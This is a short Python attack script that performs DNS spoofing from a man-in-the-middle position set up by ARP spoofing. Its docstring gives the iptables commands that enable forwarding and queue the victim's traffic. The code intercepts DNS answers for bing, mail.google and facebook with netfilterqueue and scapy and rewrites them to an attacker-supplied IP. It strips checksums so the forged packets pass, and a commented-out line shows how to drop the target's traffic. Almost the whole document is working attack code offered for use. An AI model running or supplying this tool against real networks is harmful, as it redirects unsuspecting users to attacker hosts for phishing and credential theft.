#!/usr/bin/env python

'''
    ARP Spoof against the target
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -I FORWARD -j NFQUEUE --queue-num 0

    We use forward queue for remote computers
    If we want to test on our local machine, we must redirect the input and ouput packet chains


    Install netfilterqueue by:
    pip3 install -U git+https://github.com/kti/python-netfilterqueue

    run:
    iptables --flush
    when done
'''

# Access the queue by:
import argparse
import netfilterqueue as nfq
import scapy.all as sp

def get_arg(parser, flag, name, text):
    parser.add_argument("-" + flag, "--" + name, dest=name, help=text)
    return parser

targets = ['bing', 'mail.google', 'facebook']
def process(packet):
    sp_packet = sp.IP(packet.get_payload())
    if sp_packet.haslayer(sp.DNSRR):
        qname = sp_packet[sp.DNSQR].qname
        # We need the query name to match our target URLs
        for t in targets:
            if t in qname.decode("utf-8"):
                print("[+] Spoofed "+ t)
                # We change the response IP
                answer = sp.DNSRR(rrname = qname, rdata = fakeIP)
                sp_packet[sp.DNS].an = answer
                # We change the count of answers
                sp_packet[sp.DNS].ancount = 1

                # Remove the checksum that indicates the packet has been
                # altered
                del sp_packet[sp.IP].len
                del sp_packet[sp.UDP].len
                del sp_packet[sp.IP].chksum
                del sp_packet[sp.UDP].chksum

                packet.set_payload(bytes(sp_packet))


    #to forward traffic
    packet.accept()
    # to cut off the connection of target
    #packet.drop()

parser = argparse.ArgumentParser()
parser = get_arg(parser, 's', 'spoofIP', 'IP address where target should redirect')

value = parser.parse_args()
fakeIP = value.spoofIP
queue = nfq.NetfilterQueue()
queue.bind(0, process)
queue.run()
